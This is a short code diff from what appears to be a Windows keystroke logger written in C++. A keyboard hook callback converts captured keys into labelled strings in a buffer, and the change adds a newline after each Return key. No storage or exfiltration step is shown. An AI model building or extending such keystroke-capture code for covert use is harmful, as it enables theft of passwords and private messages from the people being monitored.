@@ -55,7 +55,7 @@ LRESULT CALLBACK KeyboardProc(int nCode,
             } else if (vkCode == VK_CAPITAL) {
                 codepointStringBuffer.push_back(std::string("<CAPS LOCK>"));
             } else if (vkCode == VK_RETURN) {
-                codepointStringBuffer.push_back(std::string("<RETURN>"));
+                codepointStringBuffer.push_back(std::string("<RETURN>\n"));
             } else if (vkCode == VK_BACK) {
                 codepointStringBuffer.push_back(std::string("<BACKWARDS>"));
             } else if (vkCode == VK_TAB) {
